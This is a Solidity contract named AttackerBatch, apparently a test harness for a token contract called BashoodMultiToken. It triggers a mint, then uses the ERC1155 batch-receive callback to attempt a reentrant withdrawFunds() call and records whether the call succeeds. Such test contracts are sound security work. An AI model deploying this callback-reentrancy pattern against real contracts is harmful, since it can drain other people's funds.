// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IBashoodMultiToken {
    function mintAllNFTs() external;
    function withdrawFunds() external;
    function owner() external view returns (address);
}

contract AttackerBatch is IERC1155Receiver {
    IBashoodMultiToken public target;
    address public deployer;
    bool public withdrawAttempted;
    bool public withdrawSucceeded;
    event BatchReceivedCalled(address operator);

    constructor() {
        deployer = msg.sender;
    }

    function setTarget(address _target) external {
        require(msg.sender == deployer, "only deployer");
        target = IBashoodMultiToken(_target);
    }

    // Called when contract receives a batch of tokens
    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external override returns (bytes4) {
        // Emit with block.timestamp and operator to make the event unique and easier to filter in logs
        emit BatchReceivedCalled(msg.sender);
        withdrawAttempted = true;
        try target.withdrawFunds() {
            withdrawSucceeded = true;
        } catch {
            withdrawSucceeded = false;
        }
        return this.onERC1155BatchReceived.selector;
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return false;
    }

    // Initiate the mint call on the target contract from this contract's context
    function attack() external {
        require(address(target) != address(0), "target not set");
        target.mintAllNFTs();
    }
}
